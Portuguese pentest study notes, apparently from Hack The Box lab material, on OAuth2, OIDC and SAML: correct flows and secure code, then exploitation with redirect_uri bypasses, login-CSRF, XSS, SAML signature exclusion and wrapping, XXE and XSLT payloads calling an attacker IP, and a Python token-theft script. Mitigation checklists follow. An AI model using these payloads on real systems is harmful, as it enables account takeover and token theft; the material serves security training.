---
title: "OAuth2 & SSO"
---

# OAuth2 e SSO (SAML)

# O que é?

**OAuth 2.0** é um framework de **autorização** (não de autenticação) definido pela RFC 6749, publicada em 2012. O objetivo central do OAuth é permitir que uma aplicação (chamada de "client") acesse recursos de outra aplicação em nome do usuário, **sem que o usuário precise revelar suas credenciais ao client**. É a separação entre "quem você é" e "o que você está permitindo que esta aplicação faça em seu nome".

Distinção crítica que muitos desenvolvedores confundem:
- **OAuth 2.0** responde à pergunta: *"Esta aplicação está autorizada a acessar estes recursos?"*
- **Autenticação** responde à pergunta: *"Quem é este usuário?"*

OAuth 2.0 por si só não autentica usuários. Ele apenas delega autorização de acesso a recursos.

**OpenID Connect (OIDC)** é uma camada de autenticação construída sobre OAuth 2.0, padronizada pelo OpenID Foundation. Enquanto OAuth lida com tokens de acesso (`access_token`), o OIDC adiciona o conceito de `id_token` — um JWT contendo informações de identidade do usuário (nome, email, foto, etc.). É o OIDC que permite "Login com Google" de forma padronizada.

**SSO (Single Sign-On)** é o conceito de permitir que um usuário faça login uma única vez e acesse múltiplos sistemas sem precisar se autenticar novamente. O SSO é um benefício de experiência do usuário que pode ser implementado com diferentes protocolos:
- **OAuth 2.0 + OIDC**: padrão moderno para web e mobile
- **SAML 2.0** (Security Assertion Markup Language): padrão XML-based, predominante em ambientes corporativos enterprise. Definido pelo OASIS, amplamente usado antes do OIDC ganhar tração. Menos eficiente (XML verboso vs JWT compacto), mas extremamente presente em sistemas legados.
- **Kerberos**: padrão de rede usado internamente em Active Directory/ambientes Windows

**SAML** opera com assertions XML assinadas digitalmente. O Identity Provider (IdP) emite uma assertion afirmando "este usuário é quem diz ser, com estes atributos" e o Service Provider (SP) confia nessa afirmação se a assinatura for válida.

---

# Onde é implementado?

OAuth 2.0, OIDC e SAML são encontrados em praticamente todo sistema moderno que precisar de autenticação federada. Como pentester, você os verá constantemente.

**"Login com Google/GitHub/Facebook/Apple"**: toda vez que um site oferece login social, está implementando OAuth 2.0 + OIDC. O site não armazena sua senha — delega a autenticação ao provedor de identidade. Presente em praticamente toda startup, e-commerce e SaaS moderno.

**Sistemas corporativos com Azure AD / Okta / Auth0**: empresas com centenas ou milhares de funcionários usam provedores de identidade centralizados. Um único login no IdP corporativo dá acesso a Salesforce, Slack, GitHub Enterprise, AWS Console, Jira e dezenas de outras ferramentas. Todos esses sistemas aceitam tokens OAuth/OIDC ou assertions SAML do IdP corporativo.

**APIs que delegam acesso a terceiros**: o Spotify que acessa sua agenda do Google Calendar para sugerir músicas; o app de produtividade que lê seus emails do Gmail; o dashboard que acessa dados do GitHub — todos usam OAuth 2.0. O usuário concede permissão específica (scope) sem entregar credenciais.

**B2B SaaS com SAML/OIDC**: plataformas enterprise como Salesforce, ServiceNow, Workday e SAP oferecem integração SAML para que clientes corporativos possam usar seus IdPs existentes (Azure AD, Okta, ADFS) para autenticar usuários. Toda grande empresa com mais de algumas centenas de funcionários tem alguma implementação SAML.

**Onde você encontra em pentest:**
- Botão "Login with..." em páginas de autenticação
- Redirecionamentos para `accounts.google.com`, `login.microsoftonline.com`, `login.okta.com`
- Parâmetros `code`, `state`, `redirect_uri` em URLs de callback
- Headers `Authorization: Bearer` com JWTs em respostas de APIs
- Requisições POST para `/acs` (Assertion Consumer Service) com parâmetro `SAMLResponse`
- Endpoints `/.well-known/openid-configuration` expondo metadados do IdP
- Parâmetros `SAMLRequest` em redirects base64-encoded

---

# Como funciona de forma adequada?

## Authorization Code Flow — o fluxo mais seguro do OAuth 2.0

O Authorization Code Flow é o fluxo recomendado para aplicações web tradicionais e SPAs com backend. Ele garante que o `access_token` nunca apareça em URLs ou logs do browser.

**Roles (papéis) do OAuth 2.0:**

| Role | Descrição |
|------|-----------|
| Resource Owner | O usuário — dono dos dados |
| Client | A aplicação que quer acesso (ex: seu app) |
| Authorization Server | Servidor que autentica o usuário e emite tokens |
| Resource Server | Servidor que hospeda os recursos protegidos (API) |

**Diagrama do fluxo completo:**

```
+----------------+          +--------------------+          +------------------+
| Resource Owner |          | Authorization      |          | Client           |
| (Usuario)      |          | Server (IdP)       |          | (Sua aplicacao)  |
+----------------+          +--------------------+          +------------------+
        |                            |                               |
        |                            |   1. Authorization Request    |
        |                            |<------------------------------|
        |                            |   GET /authorize              |
        |                            |   ?client_id=abc              |
        |                            |   &redirect_uri=...           |
        |                            |   &response_type=code         |
        |                            |   &scope=openid profile email |
        |                            |   &state=NONCE_CSRF           |
        |                            |   &code_challenge=PKCE_HASH   |
        |                            |                               |
        |  2. Tela de login/consent  |                               |
        |<---------------------------|                               |
        |  [usuario faz login e      |                               |
        |   autoriza os scopes]      |                               |
        |--------------------------->|                               |
        |                            |                               |
        |                            |   3. Authorization Code       |
        |                            |   302 redirect_uri            |
        |                            |   ?code=AUTH_CODE_TEMPORARIO  |
        |                            |   &state=NONCE_CSRF           |
        |                            |------------------------------>|
        |                            |                               |
        |                            |   4. Token Exchange           |
        |                            |   POST /token                 |
        |                            |   {code, client_secret, PKCE} |
        |                            |<------------------------------|
        |                            |                               |
        |                            |   5. Access Token + ID Token  |
        |                            |   {access_token, id_token,    |
        |                            |    refresh_token, expires_in} |
        |                            |------------------------------>|
        |                            |                               |
        |                            |          +-------------------+|
        |                            |          | Resource Server   ||
        |                            |          +-------------------+|
        |                            |   6. API Request              |
        |                            |   Authorization: Bearer       |
        |                            |   access_token                |
        |                            |<------------------------------|
        |                            |   7. Recurso protegido        |
        |                            |------------------------------>|
```

**Tipos de Grant (fluxos) do OAuth 2.0:**

O **Authorization Code** é o fluxo recomendado para aplicações web: o code é efêmero (uso único, curta duração) e a troca por token acontece server-to-server, nunca exposto no browser. O **Client Credentials** é usado por serviços máquina-a-máquina sem usuário envolvido — o client autentica diretamente com `client_id` + `client_secret` e recebe um access token. O **Device Code** é destinado a dispositivos sem browser (smart TVs, CLIs): o dispositivo exibe um código que o usuário insere em outro dispositivo para autorizar. O **Implicit** (deprecated) retornava o access token diretamente no redirect, exposto na URL, e foi depreciado pela RFC 9700 por razões de segurança.

**PKCE (Proof Key for Code Exchange)** — proteção contra interceptação do authorization code:

```
Cliente gera:
  code_verifier = random_string(43-128 chars)
  code_challenge = BASE64URL(SHA256(code_verifier))

Na Authorization Request:
  ?code_challenge=code_challenge&code_challenge_method=S256

Na Token Exchange:
  POST /token {code_verifier: ...}

O Authorization Server verifica: SHA256(code_verifier) == code_challenge
```

Isso garante que mesmo que o authorization code seja interceptado, o atacante não consegue trocá-lo por token sem conhecer o `code_verifier` original — que nunca saiu do cliente legítimo.

**Implementação correta em Python (client OAuth):**
```python
import secrets
import hashlib
import base64
import urllib.parse
import requests

class OAuthClient:
    def __init__(self, client_id, client_secret, redirect_uri, auth_server):
        self.client_id = client_id
        self.client_secret = client_secret
        self.redirect_uri = redirect_uri
        self.auth_server = auth_server

    def gerar_authorization_url(self):
        # Gerar state para protecao CSRF
        state = secrets.token_urlsafe(32)

        # Gerar PKCE
        code_verifier = secrets.token_urlsafe(43)
        code_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(code_verifier.encode()).digest()
        ).rstrip(b'=').decode()

        params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'scope': 'openid profile email',
            'state': state,
            'code_challenge': code_challenge,
            'code_challenge_method': 'S256',
        }

        url = f"{self.auth_server}/authorize?{urllib.parse.urlencode(params)}"

        # Armazenar state e code_verifier na sessao do usuario
        return url, state, code_verifier

    def trocar_code_por_token(self, code, state_recebido, state_esperado, code_verifier):
        # CRITICO: validar state antes de qualquer coisa
        if not secrets.compare_digest(state_recebido, state_esperado):
            raise ValueError("State inválido — possível ataque CSRF")

        response = requests.post(f"{self.auth_server}/token", data={
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': self.redirect_uri,
            'client_id': self.client_id,
            'client_secret': self.client_secret,
            'code_verifier': code_verifier,  # PKCE
        })
        return response.json()
```

**Validação correta de redirect_uri no Authorization Server:**
```python
# SEGURO: comparação exata de URI registrada
REDIRECT_URIS_REGISTRADAS = {
    'client_abc': ['https://app.exemplo.com/callback']
}

def validar_redirect_uri(client_id, redirect_uri):
    uris_permitidas = REDIRECT_URIS_REGISTRADAS.get(client_id, [])
    # Comparacao exata — nunca por prefixo ou substring
    if redirect_uri not in uris_permitidas:
        raise ValueError(f"redirect_uri nao autorizada: {redirect_uri}")
    return True
```

**Benefícios de segurança do fluxo correto:**
- O `access_token` nunca aparece em URLs, logs de browser ou Referer headers
- O `state` previne ataques CSRF no fluxo de autorização
- O PKCE previne interceptação e uso indevido do authorization code
- O `client_secret` nunca vai ao browser — permanece no backend
- Tokens de curta duração limitam o impacto de tokens comprometidos
- O `scope` limita o que a aplicação pode fazer com o access token

---

## A Falha: Delegação de Autenticação com Controles de Estado Insuficientes

OAuth2 e SAML existem para resolver um problema real: permitir que o usuário autorize uma aplicação a agir em seu nome sem entregar suas credenciais a ela. A suposição de design é que o fluxo de autorização tem múltiplos passos com verificações de estado que protegem contra ataques de replay e CSRF.

A falha emerge quando cada verificação de estado é implementada de forma incompleta ou ausente. OAuth tem múltiplos fluxos, cada um com suposições de segurança específicas — e cada ponto de verificação faltando cria um vetor de ataque diferente.

**Perspectiva do desenvolvedor**: OAuth parece simples na superfície — "o usuário loga no provedor e nos enviamos um token". A complexidade de segurança está nos detalhes: o parâmetro `state` parece um detalhe opcional (muitas implementações de tutorial omitem ele), `redirect_uri` parece uma proteção fácil de validar ("basta checar se começa com o domínio registrado"), e a validação da assinatura SAML parece garantida pela biblioteca.

Cada um desses "parece" é um vetor de ataque:
- **`state` ausente ou previsível**: CSRF no fluxo OAuth — atacante força vítima a vincular conta com a conta do atacante
- **`redirect_uri` validada por prefixo**: atacante usa `http://app-legit.com.evil.com/callback` ou encadeia open redirect no domínio legítimo
- **SAML assinatura não obrigatória**: SP aceita assertions sem assinatura, ou aceita a assertion errada quando há wrapping

**SSO é particularmente crítico**: uma vulnerabilidade no fluxo afeta todas as aplicações integradas ao provedor. O raio de blast é proporcional ao número de serviços que delegam autenticação para aquele IdP.

---

## Causa Raiz

### O Parâmetro `state`: Proteção CSRF no OAuth

O `state` é um nonce gerado pelo client antes de iniciar o fluxo. O authorization server devolve o mesmo valor no callback. O client verifica que o `state` recebido bate com o gerado — garantindo que o callback é resultado de um fluxo que o próprio client iniciou.

```
Sem state:
Atacante → cria authorization code para sua conta → envia URL de callback para vitima
Vitima acessa → vitima associa CONTA DO ATACANTE ao seu perfil
Atacante loga na conta da vitima via OAuth

Com state correto:
Atacante envia URL de callback → vitima não tem 'state' correspondente no cookie
→ verificação falha → ataque bloqueado
```

```python
# VULNERAVEL: sem state
@app.route('/oauth/callback')
def callback():
    code = request.args.get('code')
    # Troca code por access token sem verificar state
    token = exchange_code_for_token(code)
    login_user(token)

# SEGURO: state verificado
@app.route('/oauth/callback')
def callback():
    state_received = request.args.get('state')
    state_expected = session.pop('oauth_state', None)
    
    if not state_expected or state_received != state_expected:
        abort(403)  # CSRF detectado
    
    code = request.args.get('code')
    token = exchange_code_for_token(code)
    login_user(token)
```

### O Parâmetro `redirect_uri`: Prevenção de Token Theft

O authorization server só deve redirecionar para URIs pré-registradas (lista branca **exata**). Se a validação for por prefixo ou regex fraco, o atacante pode desviar o authorization code para um servidor controlado:

```
Registrado: https://app.example.com/callback
Bypass por prefixo: https://app.example.com.evil.com/callback  ✓ (começa com "app.example.com")
Bypass por substring: https://evil.com/?x=https://app.example.com  ✓ (contém o domínio)
```

### SAML: Assinatura que Não Protege o que Você Pensa

Em SAML, a assinatura digital protege a integridade da assertion. O problema é que:
1. Alguns SPs aceitam assertions **sem** assinatura (se a assinatura estiver ausente, não há o que verificar)
2. Em XML, a assinatura referencia um elemento pelo ID — um atacante pode injetar uma assertion maliciosa com ID diferente antes da assertion assinada, e o SP usa a primeira encontrada

---

## Como o Ataque Funciona

### OAuth2 — Entidades e Fluxo

| Entidade | Papel |
|----------|-------|
| Resource Owner | O usuário (dono dos dados) |
| Client | A aplicação que quer acessar os dados |
| Authorization Server | Servidor que autentica o usuário e emite tokens |
| Resource Server | Servidor que hospeda os recursos protegidos |

### Fluxo Authorization Code Grant (mais seguro)

```
academy.htb (Client)  <--->  hubgit.htb (Auth Server)  <--->  John (Resource Owner)
```

**Requisição 1 — Authorization Request** (Client → Auth Server, via browser):
```http
GET /auth?client_id=1337&redirect_uri=http://academy.htb/callback&response_type=code&scope=user&state=a45c12e87d4522 HTTP/1.1
Host: hubgit.htb
```

Parâmetros críticos:
- `client_id`: identifica o client registrado
- `redirect_uri`: onde o auth server redireciona após autenticação
- `response_type=code`: indica authorization code grant
- `scope`: permissões solicitadas
- `state`: nonce aleatório — proteção CSRF

**Requisição 2 — Authorization Code Grant** (Auth Server → Client, via redirect):
```http
GET /callback?code=ptsmyq2zxyvv23bl&state=a45c12e87d4522 HTTP/1.1
Host: academy.htb
```

**Requisição 3 — Access Token Request** (Client → Auth Server, server-to-server):
```http
POST /token HTTP/1.1
Host: hubgit.htb

client_id=1337&client_secret=SECRET&redirect_uri=http://academy.htb/callback&grant_type=authorization_code&code=ptsmyq2zxyvv23bl
```

**Resposta com Access Token**:
```json
{
  "access_token": "RsT5OjbzRn430zqMLgV3Ia",
  "expires_in": 3600
}
```

**Requisição de Recurso**:
```http
GET /user_info HTTP/1.1
Host: hubgit.htb
Authorization: Bearer RsT5OjbzRn430zqMLgV3Ia
```

### Fluxo Implicit Grant (menos seguro)

Sem etapa de troca de authorization code. O access token vai diretamente no redirect:

```http
GET /callback#access_token=RsT5OjbzRn430zqMLgV3Ia&token_type=Bearer&expires_in=3600&scope=user&state=abc HTTP/1.1
Host: academy.htb
```

O token fica exposto no fragmento da URL (visível no browser history, logs).

---

## Discovery / Identificação

### Identificar Implementação OAuth

```bash
# Buscar endpoints OAuth no alvo
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://alvo.com/FUZZ" \
     -mc 200,302 | grep -i "auth\|oauth\|callback\|token"

# Endpoints comuns
/oauth/authorize
/auth
/authorization/auth
/oauth2/auth
/client/callback
/oauth/token
/.well-known/openid-configuration   # descoberta automatica OAuth/OIDC
```

### Analisar o Fluxo OAuth

1. Usar Burp Suite para interceptar o fluxo completo de login OAuth
2. Identificar todos os parâmetros: `client_id`, `redirect_uri`, `state`, `scope`
3. Verificar se `state` está presente e é validado
4. Verificar como `redirect_uri` é validado
5. Testar envio do fluxo sem `state` — se funcionar, CSRF possível

---

## Exploitation OAuth2

### 1. Roubo de Access Token via redirect_uri Manipulado

**Pré-requisito**: authorization server não valida (ou valida fracamente) o `redirect_uri`.

```bash
# Passo 1: Obter o client_id executando o fluxo OAuth normal
# (interceptar no Burp — anotar o client_id)

# Passo 2: Criar link de authorization request com redirect_uri apontando para atacante
http://hubgit.htb/authorization/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=http://attacker.htb/callback&state=somevalue

# Passo 3: Entregar link para vitima (phishing, IDOR, XSS)
# Quando vitima clica e faz login, auth server redireciona para attacker.htb/callback

# Passo 4: No servidor do atacante, obter o code dos logs
curl http://attacker.htb/log

# Passo 5: Trocar o authorization code por access token
curl -s "http://hubgit.htb/client/callback?code=AUTHORIZATION_CODE&state=somevalue" \
     -H "Cookie: state=somevalue"
# O client completa o flow automaticamente — access token retornado como cookie
```

### 2. Bypass de Validação de redirect_uri

Se o servidor valida que `redirect_uri` começa com o domínio registrado:

```bash
# Subdomain bypass
http://academy.htb.attacker.htb/callback

# Basic auth credentials bypass
http://academy.htb@attacker.htb/callback

# Query parameter bypass
http://attacker.htb/callback?a=http://academy.htb

# Fragment bypass
http://attacker.htb/callback#http://academy.htb
```

**Open Redirect encadeado**:
Se `academy.htb` tem um open redirect em `/redirect?url=`, o atacante usa:
```
http://academy.htb/redirect?u=http://attacker.htb/callback
```
Isso passa na validação (domínio correto) mas redireciona para o atacante.

### 3. CSRF no OAuth — Falta de State

Se o parâmetro `state` está ausente ou não é validado, é possível realizar Login-CSRF:

**Objetivo**: forçar a vítima a logar na conta DO atacante.

```bash
# Passo 1: Atacante executa authorization request e obtem authorization code para SUA conta
POST /authorization/signin HTTP/1.1
Host: hubgit.htb

username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fclient%2Fcallback

# Resposta: redirect para /client/callback?code=AUTHORIZATION_CODE_ATACANTE

# Passo 2: Atacante cria URL de CSRF
http://hubgit.htb/client/callback?code=AUTHORIZATION_CODE_ATACANTE

# Passo 3: Vitima acessa o link
# Resultado: vitima e logada na conta do atacante
# Consequencia: vitima insere dados na conta do atacante pensando ser a sua
```

**Como o state previne**: o state é armazenado no cookie do browser. Quando o callback é chamado com um state diferente do que está no cookie, a requisição é rejeitada.

### 4. XSS no Fluxo OAuth

Os parâmetros `client_id`, `redirect_uri` e `state` podem ser refletidos na página de autorização sem sanitização:

```bash
# Testar XSS no parametro state
GET /authorization/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=/client/callback&state=<script>alert(1)</script> HTTP/1.1
Host: hubgit.htb

# Se vulneravel, XSS e executado na pagina de autorizacao (no contexto do auth server)
# Impacto: roubo do cookie de sessao do usuario autenticado no auth server
```

### 5. Abuso de Client Malicioso

Atacante registra um OAuth client malicioso no auth server:

```bash
# Criar aplicacao evil.htb registrada com hubgit.htb como OAuth provider
# Vitima loga em evil.htb com conta do hubgit.htb → atacante obtem access token

# Usar esse token em academy.htb (se academy nao valida que token foi emitido para ela)
curl -s "http://academy.htb/api/data" \
     -H "Authorization: Bearer TOKEN_DO_EVIL_HTB"
```

---

## SAML — Como Funciona

### Componentes SAML

| Componente | Papel |
|-----------|-------|
| Identity Provider (IdP) | Autentica o usuário, emite SAML assertions |
| Service Provider (SP) | Fornece o serviço, confia nas assertions do IdP |
| SAML Assertion | XML assinado com informações do usuário |

### Fluxo SAML

```
1. Usuario acessa SP (academy.htb)
2. SP redireciona para IdP com SAML request
3. Usuario autentica no IdP (sso.htb)
4. IdP gera SAML assertion assinada → envia ao SP via browser
5. SP verifica assinatura → concede acesso
```

**SAML Request** (base64 + deflate, enviado como parâmetro de URL):
```xml
<samlp:AuthnRequest
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="ONELOGIN_d9da469d44203bb0a13fa8996bea4471592101b9"
    Version="2.0"
    Destination="http://sso.htb/idp/SSOService.php"
    AssertionConsumerServiceURL="http://academy.htb/acs.php">
    <saml:Issuer>http://academy.htb/</saml:Issuer>
</samlp:AuthnRequest>
```

**SAML Response** (base64, enviada via POST):
```xml
<samlp:Response>
    <ds:Signature>...</ds:Signature>
    <saml:Assertion>
        <saml:AttributeStatement>
            <saml:Attribute Name="name">
                <saml:AttributeValue>htb-stdnt</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email">
                <saml:AttributeValue>student@academy.htb</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>
```

---

## Exploitation SAML

### 1. Signature Exclusion Attack

Se o SP verifica assinatura apenas quando ela está presente (e aceita assertions sem assinatura):

```bash
# Passo 1: Capturar SAML Response no Burp
# Passo 2: URL-decode + Base64-decode para obter XML

# Passo 3: Modificar o username no XML
# htb-stdnt → admin

# Passo 4: Remover todos os elementos ds:Signature do XML
# Passo 5: Base64-encode + URL-encode o XML modificado

# Passo 6: Enviar request modificado
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhbW[...]%2b&RelayState=%2Facs.php
```

**Via SAML Raider (Burp Extension)**:
1. Instalar SAML Raider via BApp Store
2. Interceptar POST ao /acs.php
3. Aba SAML Raider → SAML Attacks → "Remove Signatures"
4. Modificar username no XML inline
5. Re-enviar no Repeater

### 2. Signature Wrapping Attack (XSW)

Criar discrepância entre o que a assinatura protege e o que a aplicação usa:

**Conceito**: injetar uma assertion maliciosa ANTES da assertion assinada. Se a aplicação usa a PRIMEIRA assertion encontrada, usará a maliciosa. A assinatura ainda valida a segunda (legítima) assertion.

```xml
<!-- SAML Response com wrapping attack -->
<samlp:Response>
    <!-- Assertion maliciosa INJETADA (sem assinatura, ID=_evilID) -->
    <saml:Assertion ID="_evilID">
        <saml:AttributeStatement>
            <saml:Attribute Name="name">
                <saml:AttributeValue>admin</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
    
    <!-- Assertion original e assinada (legitima) -->
    <saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013">
        <!-- ... assertion original intacta ... -->
        <ds:Signature>
            <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013"/>
        </ds:Signature>
    </saml:Assertion>
</samlp:Response>
```

**Via SAML Raider**:
- SAML Attacks → XSW Attacks → selecionar variante (XSW1 a XSW8)
- "Apply XSW" → re-enviar

### 3. XXE no SAML

XML parser do SP pode estar vulnerável a XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATACANTE_IP:8000"> %xxe; ]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
    [...]
</samlp:Response>
```

```bash
# Listener no atacante
nc -lnvp 8000

# Encodar e enviar
# Se houver callback = SP e vulneravel a XXE (blind)
```

**Via SAML Raider**: SAML Attacks → "Test XXE"

### 4. XSLT Server-Side Injection

XML parser pode executar transformações XSLT:

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:copy-of select="document('http://ATACANTE_IP:8000/')"/>
    </xsl:template>
</xsl:stylesheet>
```

**Via SAML Raider**: SAML Attacks → "Test XSLT"

---

## Ferramentas

### SAML Raider (Burp Extension)

```
Extensao para Burp Suite — instalar via BApp Store
Funcionalidades:
- Highlight de requests SAML no proxy
- Decodificacao/codificacao automatica
- Todos os 8 variantes de XSW
- Signature exclusion (Remove Signatures)
- Re-sign assertions
- Test XXE e XSLT
```

### SAMLTool.io

```bash
# Decodificar SAML request/response online
# URL: https://samltool.io/

# Manualmente:
# SAML Request: URL-decode → Base64-decode → inflate (decompress)
# SAML Response: URL-decode → Base64-decode (sem inflate)

# Python para decodificar SAML Response
python3 -c "
import base64, sys
data = sys.stdin.read().strip()
print(base64.b64decode(data).decode())
"
```

---

## Automação

### Script Completo de OAuth Token Theft

```python
import requests

# Configuracao
TARGET = "http://hubgit.htb"
CLIENT_ID = "0e8f12335b0bf225"
ATTACKER = "http://attacker.htb"

# Passo 1: Criar link malicioso
malicious_url = (
    f"{TARGET}/authorization/auth?"
    f"response_type=code&"
    f"client_id={CLIENT_ID}&"
    f"redirect_uri={ATTACKER}/callback&"
    f"state=exploitstate"
)
print(f"[*] Enviar para vitima: {malicious_url}")

# Passo 2: Monitorar log do servidor do atacante
r = requests.get(f"{ATTACKER}/log")
print(f"[+] Log: {r.text}")

# Extrair authorization code do log
import re
code_match = re.search(r'code=([A-Za-z0-9]+)', r.text)
if code_match:
    auth_code = code_match.group(1)
    print(f"[+] Authorization Code: {auth_code}")
    
    # Passo 3: Completar o fluxo OAuth para obter access token
    r2 = requests.get(
        f"{TARGET}/client/callback",
        params={"code": auth_code, "state": "exploitstate"},
        cookies={"state": "exploitstate"}
    )
    print(f"[+] Resposta: {r2.text[:200]}")
```

---

## Detecção e Mitigação

### OAuth — O Que Verificar

```bash
# Verificar se state e implementado e validado
# Requisicao sem state → se funcionar, CSRF possivel
GET /auth?client_id=X&redirect_uri=Y&response_type=code HTTP/1.1
# (sem &state=...)

# Verificar validacao de redirect_uri
# Tentar subdominio
GET /auth?client_id=X&redirect_uri=http://X.attacker.com/cb&... HTTP/1.1

# Tentar open redirect encadeado
GET /auth?client_id=X&redirect_uri=http://app.com/redirect?u=http://evil.com&... HTTP/1.1
```

### SAML — O Que Verificar

```bash
# Verificar signature exclusion — remover ds:Signature do XML
# Se SP aceitar sem assinatura → vulneravel

# Verificar signature wrapping — usar SAML Raider XSW1-XSW8
# Se SP aceitar assertion injetada → vulneravel
```

### Prevenção OAuth

```
1. Sempre validar state (CSRF token) — gerar com CSPRNG, armazenar em sessão/cookie
2. Whitelist estrita de redirect_uri (protocolo + host + path exato, não prefixo)
3. Preferir authorization code grant sobre implicit (token não fica em URL)
4. Validar que access token foi emitido para o client correto (audience)
5. HTTPS em todos os endpoints — tokens em HTTP são expostos em logs
6. Short-lived access tokens (1h) + refresh tokens de longa duração
7. Validar open redirects no domínio — podem ser encadeados com redirect_uri bypass
```

### Prevenção SAML

```
1. Usar biblioteca SAML estabelecida e atualizada (não implementar própria)
2. Sempre verificar assinatura ANTES de processar dados
3. Verificar que a assertion ASSINADA e a USADA para autenticar são a mesma
4. Desabilitar entidades externas XML (previne XXE): FEATURE_DISALLOW_DOCTYPE_DECL
5. Validar timestamps (NotOnOrAfter, NotBefore)
6. Validar Audience restriction (assertion emitida para este SP)
```

---

## Cheatsheet Rápido

| Ataque | Técnica |
|--------|---------|
| OAuth token theft | Manipular redirect_uri para servidor do atacante |
| OAuth redirect bypass | Subdomínio, credenciais, query param, fragment |
| OAuth CSRF | Forçar vítima a acessar link com auth code do atacante |
| OAuth XSS | Injetar em client_id/state refletido na página auth |
| SAML signature exclusion | Remover ds:Signature + modificar assertion |
| SAML XSW | Injetar assertion maliciosa antes da assinada (8 variantes) |
| SAML XXE | DTD com ENTITY apontando para servidor do atacante |
| SAML XSLT | xsl:stylesheet com document() apontando para atacante |

---

## Módulos Relacionados

OAuth e SAML conectam a autenticação federada aos demais vetores do módulo de autenticação e além. O módulo de **Brute Force/Broken Auth** (`01_brute_force_e_broken_auth.md`) é relevante porque OAuth CSRF (login-CSRF forçando o código de autorização do atacante na sessão da vítima) produz account takeover de forma análoga ao brute force direto. **Session Security** (`04_session_security.md`) se aplica após a obtenção de um access token OAuth válido: o comportamento de sequestro é equivalente ao de um session hijack clássico. O módulo de **XSS** é complementar porque XSS no domínio do authorization server permite roubar tokens de sessão do usuário autenticado no IdP, escalando um XSS a comprometimento de SSO. As referências externas principais são OAuth 2.0 RFC 6749, o SAML Security Cheat Sheet (OWASP), a extensão SAML Raider para Burp Suite, o PortSwigger Web Security Academy — OAuth Authentication, e o módulo 3 do HTB Senior Web Pentester — Attacking Authentication Mechanisms.
